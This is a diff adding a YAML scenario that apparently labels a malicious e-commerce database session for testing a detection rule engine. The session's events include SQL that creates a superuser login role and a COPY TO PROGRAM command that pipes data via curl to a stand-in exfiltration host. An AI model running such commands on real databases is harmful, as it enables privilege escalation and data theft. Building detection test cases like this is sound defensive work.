@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_45_data_tamper_mal_1256
+family_id: gen_ecommerce_45_data_tamper_mal_fam1256
+domain: ecommerce
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_142817 SUPERUSER LOGIN PASSWORD 'x730747'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.66.17.242
+      port: 9001
